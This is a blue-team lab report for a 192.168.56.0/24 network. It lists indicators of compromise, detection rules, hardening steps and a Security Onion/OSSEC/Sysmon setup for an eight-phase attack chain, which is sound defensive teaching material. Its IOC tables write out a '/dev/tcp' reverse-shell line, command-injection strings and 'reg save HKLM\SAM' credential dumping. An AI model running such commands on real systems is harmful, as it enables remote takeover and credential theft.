# Blue Team Correlation Report

**Generated:** 2026-03-15
**Lab Network:** 192.168.56.0/24 (VirtualBox Host-Only)
**Attack Chain:** 118 steps across 8 lab modules
**Companion Detection Files:** See `redteam-correlation/[toolname]-detections.md`

---

## Table of Contents

1. [Attack Summary](#1-attack-summary)
2. [Indicators of Compromise](#2-indicators-of-compromise)
3. [Detection Opportunities](#3-detection-opportunities)
4. [Hardening Recommendations](#4-hardening-recommendations)
5. [Lab Build Instructions for Blue Team](#5-lab-build-instructions-for-blue-team)

---

## 1. Attack Summary

### Kill Chain Overview

| Phase | Lab | Steps | Primary Tools | Source | Target | Detection Difficulty |
|-------|-----|-------|---------------|--------|--------|---------------------|
| OSINT & Passive Recon | Lab 1 | 1-11 | whois, dig, theHarvester, Shodan, Google Dorks | Kali (.103) | External/Public | **Hard** - No direct network contact |
| Active Recon & Scanning | Lab 2 | 12-29 | nmap, Nessus, enum4linux, nikto, gobuster | Kali (.103) | Ubuntu (.102), Windows (.101) | **Easy** - High volume of anomalous traffic |
| Web Exploitation | Lab 3 | 30-44 | sqlmap, Burp Suite, curl, manual injection | Kali (.103) | Ubuntu (.102) DVWA | **Medium** - Requires WAF/app-layer inspection |
| Password Attacks | Lab 4 | 45-57 | hydra, john, hashcat, crackmapexec, medusa | Kali (.103) | Ubuntu (.102), Windows (.101) | **Easy** - Repeated auth failures before success |
| Metasploit Framework | Lab 5 | 58-78 | msfconsole, msfvenom, meterpreter | Kali (.103) | Ubuntu (.102), Windows (.101) | **Medium** - Known signatures but customizable |
| Linux Privilege Escalation | Lab 6 | 79-91 | SUID abuse, sudo misconfig, cron exploits, kernel exploits, LinPEAS | Ubuntu (.102) local | Ubuntu (.102) local | **Medium** - Requires endpoint telemetry |
| Windows Privilege Escalation | Lab 7 | 92-103 | Service exploits, registry abuse, token impersonation, Potato attacks, winPEAS | Windows (.101) local | Windows (.101) local | **Medium** - Requires Sysmon/EDR |
| Post-Exploitation | Lab 8 | 104-118 | SSH keys, cron persistence, lateral movement, pivoting, exfiltration | Ubuntu (.102), Kali (.103) | Ubuntu (.102), Windows (.101) | **Hard** - Blends with legitimate admin activity |

### Machines Involved

| Machine | IP | Role | OS | Key Services Targeted |
|---------|------|------|----|-----------------------|
| Kali Linux | 192.168.56.103 | Attacker | Kali Rolling | HTTP server (8000/8080), netcat listeners (4444-4448), Chisel (8080), iodined |
| Ubuntu Server | 192.168.56.102 | Target | Ubuntu 20.04+ | SSH (22), HTTP/Apache (80), MySQL (3306), DVWA, Samba (139/445) |
| Windows 11 | 192.168.56.101 | Target | Windows 11 | RDP (3389), SMB (445), SSH (22), WinRM (5985), various vulnerable services |

### Attack Flow Diagram

```
Lab 1: OSINT          Lab 2: Scanning         Lab 3: Web Exploit
(passive recon) -----> (active recon) -------> (DVWA on Ubuntu)
                            |                        |
                            v                        v
                       Lab 4: Password         Credentials
                       Attacks (brute          harvested from
                       force SSH/RDP/          SQLi, config
                       SMB/HTTP)               files
                            |                        |
                            +--------+-------+-------+
                                     |
                                     v
                              Lab 5: Metasploit
                              (exploitation &
                              payload delivery)
                                     |
                            +--------+--------+
                            |                 |
                            v                 v
                    Lab 6: Linux         Lab 7: Windows
                    PrivEsc              PrivEsc
                    (Ubuntu .102)        (Windows .101)
                            |                 |
                            +--------+--------+
                                     |
                                     v
                              Lab 8: Post-Exploitation
                              (persistence, lateral
                              movement, pivoting,
                              exfiltration)
```

---

## 2. Indicators of Compromise

### 2.1 Network-Level IOCs

#### Attacker Infrastructure

| Indicator | Type | Context |
|-----------|------|---------|
| 192.168.56.103 | IP Address | Attacker (Kali) -- source of all scanning, exploitation, C2 |
| 192.168.56.103:8000 | IP:Port | Python HTTP server for tool/payload staging |
| 192.168.56.103:8080 | IP:Port | Chisel reverse proxy server |
| 192.168.56.103:4444-4448 | IP:Port range | Netcat/Metasploit reverse shell listeners |
| 192.168.56.103:5555 | IP:Port | Meterpreter listener |

#### Suspicious Port Activity

| Port | Protocol | Activity | Lab Phase |
|------|----------|----------|-----------|
| 4444/tcp | TCP | Reverse shell callback (most common) | Labs 5, 6, 8 |
| 4445-4448/tcp | TCP | Additional reverse shell listeners | Labs 7, 8 |
| 5555/tcp | TCP | Meterpreter session | Lab 7 |
| 8000/tcp | TCP | Python HTTP server (tool staging) | Labs 2-8 |
| 8080/tcp | TCP | Chisel server | Lab 8 |
| 8081/tcp | TCP | HTTP upload server (exfiltration) | Lab 8 |
| 9999/tcp | TCP | Netcat file transfer (exfil) | Lab 8 |
| 1080/tcp | TCP | SOCKS proxy (pivot) | Lab 8 |
| 53/udp | UDP | DNS tunneling (dnscat2/iodine) | Lab 8 |

#### Scanning Signatures

| Pattern | Tool | Detection |
|---------|------|-----------|
| SYN scan from single source to many ports | nmap -sS | Many half-open connections, no ACK |
| Sequential port probing 1-65535 | nmap -p- | Unnaturally ordered port access |
| UDP probe spray | nmap -sU | High volume of UDP to varied ports |
| HTTP requests to `/nikto-test`, known vuln paths | nikto | Signature-based URL patterns |
| Rapid sequential HTTP GET/POST to wordlist paths | gobuster/dirb | High-rate 404 responses |
| SMB null session + RPC enumeration | enum4linux | Anonymous SMB/RPC bind attempts |

### 2.2 Application-Level IOCs

#### Web Attack Signatures

| Pattern | Attack Type | Lab Step |
|---------|-------------|----------|
| `' OR 1=1 --` in HTTP parameters | SQL Injection | Lab 3 |
| `sqlmap` User-Agent string | Automated SQLi | Lab 3 |
| `<script>alert(` in form submissions | Cross-Site Scripting | Lab 3 |
| `; whoami`, `| cat /etc/passwd` in parameters | Command Injection | Lab 3 |
| `.php` extension in file uploads with PHP content | Malicious File Upload | Lab 3 |
| `../../etc/passwd` in URL parameters | Local File Inclusion | Lab 3 |
| `http://192.168.56.103/` in URL parameters | Remote File Inclusion | Lab 3 |

#### Brute Force Signatures

| Pattern | Tool | Target Service |
|---------|------|----------------|
| >5 failed SSH logins/minute from single IP | hydra | SSH (22) |
| >5 failed SMB logins/minute from single IP | hydra/crackmapexec | SMB (445) |
| >10 failed HTTP POST /login from single IP | hydra | HTTP auth |
| >5 failed RDP logins/minute from single IP | hydra/crowbar | RDP (3389) |
| >5 failed MySQL logins/minute from single IP | hydra | MySQL (3306) |

### 2.3 Host-Level IOCs (Linux -- Ubuntu .102)

#### File Artifacts

| Path | Description | Lab Phase |
|------|-------------|-----------|
| `/tmp/linpeas.sh` | LinPEAS enumeration script | Lab 6 |
| `/tmp/LinEnum.sh` | LinEnum enumeration script | Lab 6 |
| `/tmp/linpeas_output.txt` | LinPEAS scan results | Lab 6 |
| `/tmp/pspy64` | Process spy (cron monitor) | Lab 6 |
| `/tmp/rootbash` | SUID copy of /bin/bash | Lab 6 |
| `/tmp/.syshelper` | Hidden SUID bash copy | Lab 8 |
| `/tmp/shell.so`, `/tmp/preload.so` | Malicious LD_PRELOAD libraries | Lab 6 |
| `/tmp/exploit/date` | PATH hijack binary | Lab 6 |
| `/tmp/hijack/date` | PATH hijack binary (alt) | Lab 6 |
| `/tmp/chisel` | Chisel tunneling tool | Lab 8 |
| `/etc/systemd/system/sys-update.service` | Persistence systemd service | Lab 8 |

#### Process Anomalies

| Indicator | Description |
|-----------|-------------|
| `bash -i >& /dev/tcp/192.168.56.103/4444` | Reverse shell process |
| `/tmp/.syshelper -p` | SUID backdoor execution |
| `python3 -c 'import os; os.setuid(0)'` | Python privilege escalation |
| `find . -exec /bin/sh -p` | SUID find exploitation |
| Processes with EUID 0 spawned by non-root users | Privilege escalation indicator |

#### Account Anomalies

| Indicator | Description |
|-----------|-------------|
| New user `sysbackup` with sudo group | Backdoor account creation |
| SSH keys added to `authorized_keys` with comment "persist" | Persistence mechanism |
| Reverse shell in crontab (`/dev/tcp`) | Cron persistence |
| Reverse shell appended to `.bashrc` | Login trigger persistence |

### 2.4 Host-Level IOCs (Windows -- .101)

#### File Artifacts

| Path | Description | Lab Phase |
|------|-------------|-----------|
| `C:\Temp\winPEASx64.exe` | winPEAS enumeration | Lab 7 |
| `C:\Temp\reverse.exe` | Reverse shell payload | Lab 7 |
| `C:\Temp\meterpreter.exe` | Meterpreter payload | Lab 7 |
| `C:\Temp\exploit.msi` | AlwaysInstallElevated MSI payload | Lab 7 |
| `C:\Temp\Service.exe` | Unquoted path exploit binary | Lab 7 |
| `C:\Temp\hijackme.dll` | DLL hijacking payload | Lab 7 |
| `C:\Temp\SAM`, `C:\Temp\SYSTEM` | Dumped registry hives | Lab 7, 8 |
| `C:\Windows\Temp\payload.exe` | Persistence payload | Lab 8 |
| `C:\Windows\Temp\update.exe` | Persistence payload (HKLM Run) | Lab 8 |
| `C:\Windows\Temp\svc_payload.exe` | Service persistence payload | Lab 8 |
| `C:\Windows\Temp\loot.zip` | Staged exfiltration data | Lab 8 |

#### Registry Anomalies

| Key | Value | Indicator |
|-----|-------|-----------|
| `HKCU\Software\Classes\ms-settings\Shell\Open\command` | Path to payload | UAC bypass (fodhelper) |
| `HKCU\Software\Classes\mscfile\Shell\Open\command` | Path to payload | UAC bypass (eventvwr) |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsHelper` | Payload path | Run key persistence |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemHelper` | Payload path | User-level persistence |
| `HKLM\SYSTEM\CurrentControlSet\Services\regsvc\ImagePath` | Modified binary path | Service registry hijack |

#### Scheduled Task Anomalies

| Task Name | Trigger | Payload |
|-----------|---------|---------|
| `Microsoft\Windows\SystemMaintenance` | Every 15 min | `C:\Windows\Temp\update.exe` |
| `Microsoft\Windows\NetFramework\Update` | On logon | Hidden PowerShell script |
| `Microsoft\Windows\Maintenance` | Every 30 min | `C:\Windows\Temp\payload.exe` |

#### Service Anomalies

| Service Name | Indicator |
|-------------|-----------|
| `WindowsCoreHelper` | Non-Microsoft service running payload as SYSTEM |
| `VulnSvc` | Modified binpath to payload |
| `DaclSvc` | Modified binpath via insecure DACL |

#### WMI Persistence

| Component | Name | Indicator |
|-----------|------|-----------|
| `__EventFilter` | SystemCoreUpdate | WQL query monitoring uptime |
| `CommandLineEventConsumer` | SystemCoreUpdate | Executes `C:\Windows\Temp\update.exe` |
| `__FilterToConsumerBinding` | N/A | Links filter to consumer |

### 2.5 Network Flow IOCs

| Source | Destination | Pattern | Meaning |
|--------|-------------|---------|---------|
| .103 -> .102:22 | SSH | Brute force then sustained session | Credential compromise |
| .103 -> .102:80 | HTTP | sqlmap/nikto/gobuster patterns | Web exploitation |
| .103 -> .101:445 | SMB | enum4linux, crackmapexec, psexec | Lateral movement/PtH |
| .103 -> .101:3389 | RDP | xfreerdp with NLA or PtH | Lateral movement |
| .102:any -> .103:4444 | TCP | Outbound initiated, long-lived | Reverse shell |
| .101:any -> .103:4444 | TCP | Outbound initiated, long-lived | Reverse shell |
| .102 -> .103:8000 | HTTP | wget/curl downloads | Tool staging |
| .101 -> .103:8000 | HTTP | certutil/IWR downloads | Tool staging |
| .103 -> .102:22 (SOCKS) | SSH -D | Dynamic port forward tunnel | Pivoting |
| .102 -> .103:8080 | HTTP/WebSocket | Chisel client connection | Reverse SOCKS pivot |
| .102:any -> .103:53 | DNS | High-volume TXT/A queries with hex subdomains | DNS exfiltration |
| .101 -> .103:share | SMB | `copy \\192.168.56.103\share\` | SMB exfiltration |

---

## 3. Detection Opportunities

### Phase 1: OSINT & Passive Recon (Labs 1)

**MITRE ATT&CK:** T1589 (Gather Victim Identity), T1590 (Gather Victim Network), T1593 (Search Open Websites/Domains), T1596 (Search Open Technical Databases)

| What to Detect | Log Source | Detection Method |
|----------------|------------|------------------|
| DNS lookups for target domains from lab network | DNS server logs, Zeek dns.log | Alert on external DNS queries from .103 |
| Shodan/Censys API queries | Proxy/firewall logs | URL pattern matching for shodan.io, censys.io |
| Google dorking traffic | Proxy logs | High volume Google searches with `site:`, `intitle:`, `filetype:` |

**Detection Difficulty:** Hard -- most activity is passive and external.
**Companion files:** `zeek-detections.md`, `security-onion-detections.md`

---

### Phase 2: Active Scanning (Lab 2)

**MITRE ATT&CK:** T1046 (Network Service Scanning), T1135 (Network Share Discovery), T1018 (Remote System Discovery)

| What to Detect | Log Source | Detection Method |
|----------------|------------|------------------|
| Port scanning (SYN/Connect/UDP) | Snort/Suricata, Zeek conn.log, firewall logs | >100 connection attempts from single source in <60s |
| Service version probing | Snort, Zeek | Nmap service fingerprint strings in payloads |
| SMB enumeration (enum4linux) | Windows Security Log (4625, 4624), Zeek smb.log | Anonymous/null session SMB logons |
| HTTP directory brute force | Apache/IIS access logs, Zeek http.log | >50 404s from single IP in <60s |
| Vulnerability scanning (Nessus/nikto) | Snort, Web server logs | Known scanner User-Agent strings, vuln-check URIs |

**Detection Difficulty:** Easy -- scanning generates enormous volumes of anomalous traffic.

**Companion files:** `snort-detections.md`, `zeek-detections.md`, `splunk-detections.md`, `wireshark-detections.md`, `elk-detections.md`, `nmap-detections.md`

---

### Phase 3: Web Exploitation (Lab 3)

**MITRE ATT&CK:** T1190 (Exploit Public-Facing App), T1059.004 (Unix Shell), T1505.003 (Web Shell)

| What to Detect | Log Source | Detection Method |
|----------------|------------|------------------|
| SQL injection attempts | WAF, Apache access/error logs, Splunk | `' OR`, `UNION SELECT`, `sqlmap` in params |
| XSS payloads | WAF, Apache logs | `<script>`, `onerror=`, `javascript:` in params |
| Command injection | Apache logs, OSSEC | `; whoami`, `| cat`, backtick patterns in HTTP params |
| Malicious file uploads | Apache logs, OSSEC FIM | PHP files appearing in upload directories |
| LFI/RFI attempts | Apache logs | `../../` traversal, external URLs in `page=` params |
| Web shell activity | OSSEC FIM, Zeek http.log | POST requests to newly-created PHP files in /uploads/ |

**Detection Difficulty:** Medium -- requires application-layer inspection.

**Companion files:** `snort-detections.md`, `ossec-detections.md`, `splunk-detections.md`, `yara-detections.md`, `elk-detections.md`

---

### Phase 4: Password Attacks (Lab 4)

**MITRE ATT&CK:** T1110.001 (Brute Force), T1110.003 (Password Spraying), T1110.004 (Credential Stuffing)

| What to Detect | Log Source | Detection Method |
|----------------|------------|------------------|
| SSH brute force | auth.log, Zeek ssh.log, OSSEC | >5 failed SSH auths from same IP in 60s |
| SMB brute force | Windows Security (4625), Zeek smb.log | >5 failed SMB logons from same IP |
| RDP brute force | Windows Security (4625), NLA events | >5 failed RDP logons from same IP |
| HTTP brute force | Apache access logs | >10 POST /login with varied credentials |
| MySQL brute force | MySQL error log | Rapid `Access denied` entries |
| Credential spraying | Windows Security (4625) | Same password across many accounts |
| Successful login after brute force | auth.log, Windows Security (4624) | Success immediately following many failures from same IP |

**Detection Difficulty:** Easy -- high signal-to-noise ratio from failed authentication events.

**Companion files:** `splunk-detections.md`, `ossec-detections.md`, `elk-detections.md`, `zeek-detections.md`, `snort-detections.md`

---

### Phase 5: Metasploit Exploitation (Lab 5)

**MITRE ATT&CK:** T1203 (Exploitation for Client Execution), T1059.006 (Python), T1071.001 (Web Protocols for C2)

| What to Detect | Log Source | Detection Method |
|----------------|------------|------------------|
| Metasploit auxiliary scanning | Snort/Suricata, Zeek | MSF module User-Agent strings, known exploit signatures |
| Msfvenom payload delivery | Snort, Zeek http.log | PE/ELF downloads from non-standard HTTP servers |
| Meterpreter session establishment | Snort, Zeek conn.log | Meterpreter TLV protocol signatures, staged payload handshake |
| Reverse shell connections | Zeek conn.log, firewall | Outbound TCP from targets to .103 on 4444-5555 |
| EternalBlue/MS17-010 | Snort SID:2024218+ | SMB exploit attempt signatures |
| Post-exploitation modules | Sysmon (process creation), OSSEC | hashdump, kiwi/mimikatz, getsystem patterns |

**Detection Difficulty:** Medium -- Metasploit has well-known signatures but supports encoding/evasion.

**Companion files:** `snort-detections.md`, `yara-detections.md`, `splunk-detections.md`, `cuckoo-detections.md`, `velociraptor-detections.md`

---

### Phase 6: Linux Privilege Escalation (Lab 6)

**MITRE ATT&CK:** T1548.001 (SUID/SGID Abuse), T1548.003 (Sudo Bypass), T1053.003 (Cron), T1574.007 (PATH Hijacking), T1068 (Exploitation for Privilege Escalation)

| What to Detect | Log Source | Detection Method |
|----------------|------------|------------------|
| SUID binary abuse (find -exec, bash -p) | auditd, OSSEC | EUID=0 processes spawned by non-root users |
| sudo misconfig exploitation | auth.log, auditd | Sudo usage for vim/find/awk/env followed by shell spawn |
| LD_PRELOAD injection | auditd, OSSEC | LD_PRELOAD environment variable in sudo context |
| Cron script modification | OSSEC FIM, auditd | Write to files in /etc/cron*, /opt/scripts/ |
| PATH hijacking | auditd | Executable files created in /tmp with names matching system commands |
| Kernel exploit execution | auditd, dmesg/syslog | Compilation in /tmp (gcc), execution of unknown binaries |
| LinPEAS/LinEnum execution | OSSEC, auditd | Known tool filenames, chmod +x in /tmp |
| Capability abuse | auditd | cap_setuid binaries spawning shells |

**Detection Difficulty:** Medium -- requires endpoint telemetry (auditd/OSSEC).

**Companion files:** `ossec-detections.md`, `splunk-detections.md`, `velociraptor-detections.md`, `yara-detections.md`

---

### Phase 7: Windows Privilege Escalation (Lab 7)

**MITRE ATT&CK:** T1574.009 (Unquoted Service Path), T1574.001 (DLL Hijacking), T1548.002 (UAC Bypass), T1134.001 (Token Impersonation)

| What to Detect | Log Source | Detection Method |
|----------------|------------|------------------|
| Unquoted service path exploitation | Sysmon (Event 1, 11), Windows Security | New EXE created in Program Files intermediate directory |
| Service binpath modification | Windows System log (7045), Sysmon | `sc config` changing service binary path |
| AlwaysInstallElevated abuse | Sysmon (Event 1) | msiexec /quiet /qn executing non-standard MSI |
| DLL hijacking | Sysmon (Event 7) | DLL loaded from writable/unusual paths |
| UAC bypass via fodhelper/eventvwr | Sysmon (Event 12, 13) | Registry writes to `ms-settings\Shell\Open\command` or `mscfile\Shell\Open\command` |
| Token impersonation (Potato) | Sysmon (Event 1) | PrintSpoofer/JuicyPotato/GodPotato process creation |
| winPEAS/PowerUp execution | Sysmon (Event 1), AMSI | Known tool names, PowerShell `Invoke-AllChecks` |
| Registry hive dumping | Windows Security (4663), Sysmon | `reg save HKLM\SAM`, `reg save HKLM\SYSTEM` |

**Detection Difficulty:** Medium -- Sysmon + proper Windows logging provides strong detection.

**Companion files:** `splunk-detections.md`, `velociraptor-detections.md`, `psaa-detections.md`, `yara-detections.md`, `elk-detections.md`

---

### Phase 8: Post-Exploitation (Lab 8)

**MITRE ATT&CK:** T1098.004 (SSH Authorized Keys), T1053 (Scheduled Task/Job), T1136.001 (Local Account), T1021.004 (SSH Lateral Movement), T1550.002 (Pass-the-Hash), T1572 (Protocol Tunneling), T1048 (Exfiltration Over Alternative Protocol)

| What to Detect | Log Source | Detection Method |
|----------------|------------|------------------|
| **Persistence -- Linux** | | |
| SSH key injection | OSSEC FIM, auditd | Modifications to any `authorized_keys` file |
| Cron reverse shell | OSSEC, auditd | Crontab entries containing `/dev/tcp` |
| .bashrc backdoor | OSSEC FIM | Modifications to `.bashrc` containing `/dev/tcp` |
| Backdoor user creation | auth.log, OSSEC | `useradd` of unexpected accounts |
| SUID backdoor | OSSEC FIM, auditd | New SUID files in /tmp or hidden locations |
| systemd persistence | OSSEC FIM, journalctl | New .service files in /etc/systemd/system/ |
| **Persistence -- Windows** | | |
| Run key persistence | Sysmon (Event 12, 13) | New values in `CurrentVersion\Run` |
| Scheduled task persistence | Windows Security (4698), Sysmon | Tasks with payload paths or SYSTEM context |
| WMI event subscription | Sysmon (Event 19, 20, 21) | New WMI filter/consumer bindings |
| Service creation | Windows System (7045) | New services with non-standard binary paths |
| Startup folder drops | Sysmon (Event 11) | New executables in Startup folder |
| **Lateral Movement** | | |
| Pass-the-Hash (PtH) | Windows Security (4624, type 3), Zeek smb.log | NTLM logon from unexpected source |
| PsExec/SMBExec | Windows Security (4697, 7045), Sysmon | New service creation from remote source |
| SSH pivoting | Zeek ssh.log, auth.log | SSH sessions chained through .102 to .101 |
| SOCKS proxying | Zeek conn.log | Long-lived SSH sessions with tunnel traffic patterns |
| Chisel tunneling | Zeek http.log, conn.log | WebSocket upgrade on port 8080 followed by tunneled traffic |
| **Exfiltration** | | |
| SCP/SFTP exfil | Zeek ssh.log | Large data transfers over SSH |
| Netcat transfer | Zeek conn.log | Raw TCP transfer to .103:9999 |
| HTTP upload | Zeek http.log | POST with large body to .103:8081 |
| SMB exfil | Zeek smb.log | Copy operations to .103 share |
| DNS tunneling | Zeek dns.log | High-frequency DNS queries with hex/base64 subdomains |

**Detection Difficulty:** Hard -- blends with legitimate administration patterns; requires behavioral baselines.

**Companion files:** `ossec-detections.md`, `splunk-detections.md`, `velociraptor-detections.md`, `zeek-detections.md`, `elk-detections.md`, `psaa-detections.md`, `snort-detections.md`

---

## 4. Hardening Recommendations

### 4.1 Ubuntu Target (192.168.56.102)

| Priority | Category | Recommendation | Blocks Phase |
|----------|----------|----------------|-------------|
| **CRITICAL** | Authentication | Disable password auth in SSH; use key-only with passphrase | Lab 4 brute force |
| **CRITICAL** | Sudo | Remove NOPASSWD entries; audit `sudo -l` output | Lab 6 sudo abuse |
| **CRITICAL** | SUID | Audit and remove unnecessary SUID bits: `find / -perm -4000` | Lab 6 SUID abuse |
| **CRITICAL** | Web App | Update DVWA; enable prepared statements; disable dangerous PHP functions | Lab 3 web exploits |
| **HIGH** | Cron | Restrict cron script permissions to root-only write; use `cron.allow` | Lab 6 cron exploit |
| **HIGH** | File Integrity | Deploy OSSEC FIM on `/etc/`, `/home/*/.ssh/`, `/tmp/` | Lab 6, 8 persistence |
| **HIGH** | Kernel | Keep kernel patched; enable automatic security updates | Lab 6 kernel exploits |
| **HIGH** | Capabilities | Audit capabilities: `getcap -r /`; remove cap_setuid from interpreters | Lab 6 capability abuse |
| **HIGH** | Network | Configure iptables to restrict outbound connections (block reverse shells) | Lab 5, 6, 8 |
| **MEDIUM** | PATH | Use absolute paths in cron scripts and SUID binaries | Lab 6 PATH hijack |
| **MEDIUM** | Logging | Enable auditd with rules for execve, SUID, sudo, file writes to /tmp | Lab 6 detection |
| **MEDIUM** | SSH | Rate-limit SSH with fail2ban (maxretry=3, bantime=600) | Lab 4 brute force |
| **LOW** | Accounts | Regular review of /etc/passwd and /etc/group for unexpected users | Lab 8 persistence |

### 4.2 Windows Target (192.168.56.101)

| Priority | Category | Recommendation | Blocks Phase |
|----------|----------|----------------|-------------|
| **CRITICAL** | Services | Fix unquoted service paths; restrict service binary directory ACLs | Lab 7 service exploits |
| **CRITICAL** | Registry | Remove AlwaysInstallElevated; audit service registry key ACLs | Lab 7 registry abuse |
| **CRITICAL** | Credentials | Enable Credential Guard; disable WDigest plaintext storage | Lab 8 Mimikatz |
| **CRITICAL** | Patching | Keep Windows patched (blocks PwnKit, PrintSpoofer, JuicyPotato) | Lab 7 Potato attacks |
| **HIGH** | UAC | Set UAC to "Always Notify"; add sensitive users to Protected Users group | Lab 7 UAC bypass |
| **HIGH** | SMB | Disable SMBv1; require SMB signing; restrict anonymous access | Lab 2, 4, 8 |
| **HIGH** | RDP | Enable NLA; restrict RDP access via firewall; use RDP Gateway | Lab 4 RDP brute force |
| **HIGH** | Monitoring | Deploy Sysmon with SwiftOnSecurity config; enable PowerShell logging | Labs 7, 8 detection |
| **HIGH** | NTLM | Restrict NTLM authentication; prefer Kerberos | Lab 8 Pass-the-Hash |
| **MEDIUM** | DLL | Enable Safe DLL Search Mode; restrict writable directories in PATH | Lab 7 DLL hijack |
| **MEDIUM** | WMI | Monitor WMI subscriptions; restrict WMI remote access | Lab 8 WMI persistence |
| **MEDIUM** | Accounts | Enforce account lockout (5 attempts, 30min lockout) | Lab 4 brute force |
| **LOW** | Firewall | Restrict outbound connections to known-good destinations | Lab 7, 8 reverse shells |

### 4.3 Network-Level Hardening

| Priority | Recommendation | Blocks Phase |
|----------|----------------|-------------|
| **CRITICAL** | Deploy network IDS (Snort/Suricata) monitoring 192.168.56.0/24 | Labs 2-5 |
| **CRITICAL** | Segment attacker and target networks with firewall rules | All labs |
| **HIGH** | Deploy Zeek for full protocol-level traffic logging | All labs |
| **HIGH** | Restrict inter-host communication to required ports only | Lab 8 lateral movement |
| **HIGH** | Block outbound DNS to non-authorized resolvers | Lab 8 DNS tunneling |
| **MEDIUM** | Enable NetFlow/sFlow collection for traffic analysis | All labs |
| **MEDIUM** | Deploy a WAF in front of web applications | Lab 3 |
| **LOW** | Implement 802.1X or similar NAC for host authentication | Lab 2 ARP spoofing |

---

## 5. Lab Build Instructions for Blue Team

### 5.1 Blue Team Monitoring Architecture

```
                    +-----------------------+
                    |    Security Onion     |
                    |   (Monitor/SIEM)      |
                    | Snort + Zeek + ELK    |
                    |  192.168.56.110       |
                    +----------+------------+
                               |
                    +----------+------------+
                    |  VirtualBox Host-Only  |
                    |   192.168.56.0/24     |
                    +--+--------+--------+--+
                       |        |        |
              +--------+  +----+----+  +-+--------+
              |  Kali   |  | Ubuntu  |  | Windows  |
              |  .103   |  |  .102   |  |  .101    |
              +---------+  | +OSSEC  |  | +Sysmon  |
                           | +auditd |  | +winlogbeat
                           +---------+  +----------+
```

### 5.2 Step-by-Step Setup

#### Step 1: Deploy Security Onion (Network Monitor)

1. Create VM: 2 CPU, 8GB RAM, 200GB disk
2. Assign two interfaces: one on 192.168.56.0/24 (monitoring), one NAT (updates)
3. Install Security Onion in Standalone mode
4. Configure monitoring interface in promiscuous mode
5. Assign IP 192.168.56.110 to management interface
6. Verify Suricata, Zeek, and Elasticsearch are running:
   ```
   sudo so-status
   ```

#### Step 2: Configure Snort/Suricata Rules

1. Add custom rules from `snort-detections.md` to local rules
2. For Security Onion:
   ```
   sudo nano /opt/so/rules/nids/local.rules
   sudo so-rule-update
   ```
3. Key rules to deploy: port scan detection, brute force signatures, reverse shell patterns, tool staging HTTP downloads
4. See `snort-detections.md` for full rule set

#### Step 3: Configure Zeek Scripts

1. Deploy custom Zeek scripts from `zeek-detections.md`
2. For Security Onion:
   ```
   sudo nano /opt/so/conf/zeek/local.zeek
   ```
3. Key scripts: DNS tunneling detector, brute force tracker, reverse shell heuristic
4. See `zeek-detections.md` for full script set

#### Step 4: Deploy OSSEC on Ubuntu Target

1. Install OSSEC agent on Ubuntu (.102):
   ```
   wget -q -O - https://updates.atomicorp.com/installers/atomic | sudo bash
   sudo apt install ossec-hids-agent
   ```
2. Configure agent to report to Security Onion or standalone OSSEC manager
3. Enable FIM for critical paths:
   ```xml
   <syscheck>
     <directories check_all="yes" realtime="yes">/etc</directories>
     <directories check_all="yes" realtime="yes">/home</directories>
     <directories check_all="yes" realtime="yes">/tmp</directories>
     <directories check_all="yes" realtime="yes">/opt/scripts</directories>
     <directories check_all="yes" realtime="yes">/var/www</directories>
   </syscheck>
   ```
4. Add custom rules from `ossec-detections.md`
5. Enable auth.log and syslog monitoring

#### Step 5: Deploy Sysmon on Windows Target

1. Download Sysmon from Sysinternals
2. Deploy with SwiftOnSecurity config (or custom config from `velociraptor-detections.md`):
   ```
   sysmon64 -accepteula -i sysmonconfig-export.xml
   ```
3. Key events to monitor:
   - Event 1: Process Creation (catches tool execution, reverse shells)
   - Event 3: Network Connection (catches outbound C2)
   - Event 7: Image Loaded (catches DLL hijacking)
   - Event 11: File Create (catches payload drops)
   - Event 12/13: Registry events (catches persistence, UAC bypass)
   - Event 19/20/21: WMI events (catches WMI persistence)
4. Install Winlogbeat to forward to ELK:
   ```
   winlogbeat.exe setup
   winlogbeat.exe -e
   ```

#### Step 6: Configure ELK Dashboards

1. Import dashboards from `elk-detections.md`
2. Key dashboards to build:
   - Authentication Failures by Source IP (timeline)
   - Network Connections by Port (bar chart)
   - Process Creation with Suspicious Parents (table)
   - File Integrity Changes (timeline)
   - DNS Query Volume by Domain Length (histogram)
3. Set up index patterns: `zeek-*`, `ossec-*`, `winlogbeat-*`, `sysmon-*`

#### Step 7: Configure Splunk Queries (if using Splunk instead of ELK)

1. Import saved searches from `splunk-detections.md`
2. Configure data inputs for all log sources
3. Build correlation rules matching attack chain phases
4. Set up alerts for critical detections

#### Step 8: Deploy Velociraptor (Endpoint Hunting)

1. Install Velociraptor server:
   ```
   ./velociraptor config generate -i
   sudo ./velociraptor --config server.config.yaml frontend -v
   ```
2. Deploy agents on both targets
3. Import hunt artifacts from `velociraptor-detections.md`
4. Schedule periodic hunts for:
   - SUID binaries, sudo misconfigurations
   - Unauthorized scheduled tasks and services
   - Known tool artifacts (LinPEAS, winPEAS, Mimikatz)

#### Step 9: Deploy YARA Rules

1. Compile YARA rules from `yara-detections.md`
2. Integrate with:
   - OSSEC (active response on file creation events)
   - Velociraptor (scheduled YARA scans)
   - ClamAV (on-access scanning)
3. Key rules: pentest tool detection, reverse shell payload signatures, web shell patterns

#### Step 10: Configure PowerShell Auditing (Windows)

1. Enable Script Block Logging:
   ```
   reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
   ```
2. Enable Module Logging for all modules
3. Enable Transcription logging to a protected directory
4. Deploy detection queries from `psaa-detections.md`
5. Forward PowerShell logs (4104, 4103) to SIEM

### 5.3 Alerting Rules (Priority Order)

| Priority | Alert | Source | Threshold |
|----------|-------|--------|-----------|
| P1 | Reverse shell established | Zeek conn.log / Snort | Any outbound connection to .103 on 4444-5555 |
| P1 | Credential dumping (SAM/SYSTEM) | Sysmon Event 1, Windows Security | `reg save HKLM\SAM` or `reg save HKLM\SYSTEM` |
| P1 | New SUID file created | OSSEC FIM / auditd | Any new file with SUID bit in /tmp or hidden paths |
| P1 | Pass-the-Hash detected | Windows Security 4624 | Logon Type 3 with NTLM from unexpected source |
| P2 | Brute force detected | OSSEC / Splunk | >5 auth failures from same IP in 60s |
| P2 | Privilege escalation | Sysmon / auditd | Non-admin process spawning as SYSTEM/root |
| P2 | Persistence mechanism added | Sysmon Events 12/13, OSSEC FIM | Registry Run key or crontab modification |
